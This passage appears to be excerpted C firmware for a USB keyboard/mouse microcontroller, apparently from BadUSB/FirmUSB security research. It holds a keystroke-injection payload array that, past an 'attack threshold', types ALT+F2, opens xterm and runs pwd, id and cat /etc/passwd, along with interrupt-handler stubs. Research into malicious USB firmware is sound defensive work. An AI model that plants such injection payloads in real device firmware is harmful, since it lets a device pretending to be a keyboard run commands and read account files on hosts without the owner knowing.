 ...
 * Ref: https://www.win.tue.nl/~aeb/linux/kbd/scancodes-10.html
 * Ref: http://www.quadibloc.com/comp/scan.htm
 * Note that we are using the USB scancode set directly
 * and it is not clear wheather or not this would work form the HW.
 * Jan 11, 2017
 * daveti
 */
#define FIRMUSB_ATTACK_THRESHOLD	10000
static Byte firmusb_script[] =
{	0xe2, 0x3b, /* ALT F2 */
	0x1b, 0x17, 0x08, 0x15, 0x10, /* xterm */
	0x28, /* ENTER */
	0x13, 0x1a, 0x07, /* pwd */
	0x28, /* ENTER */
	0x0c, 0x07, /* id */
	0x28, /* ENTER */
	0x06, 0x04, 0x17, 0x2c, 0x38, 0x08, 0x17, 0x06, 0x38, 0x13, 0x04, 0x16, 0x16, 0x07, /* cat /etc/passwd */
	0x28, /* ENTER */
};
static int firmusb_inject_counter;
static Byte *firmusb_ptr;
...
#pragma save
#pragma nooverlay
static void get_descriptor(void) __using (1)
{
   switch (sdat->wValueH) {
         /* type: device */
      case USB_DT_DEVICE:
 ...
 *****************************************************************************/
static void usb_isr(void) __interrupt (8) __using (1) __critical
{
 ...
 *****************************************************************************/
#if defined (KEYBOARD)
static void kbd_serial_isr(void) __interrupt (4) __using (2) __critical
{
   Byte scancode;
   Byte mod_map;
   __bit  parse_scancode;
   register Byte i;
...
static void mouse_serial_isr(void) __interrupt (7) __using (2) __critical
{
 ...
 * duration setting.
 *****************************************************************************/
static void timer2_isr() __interrupt (5) __using (3) __critical
{
#if defined (KEYBOARD)
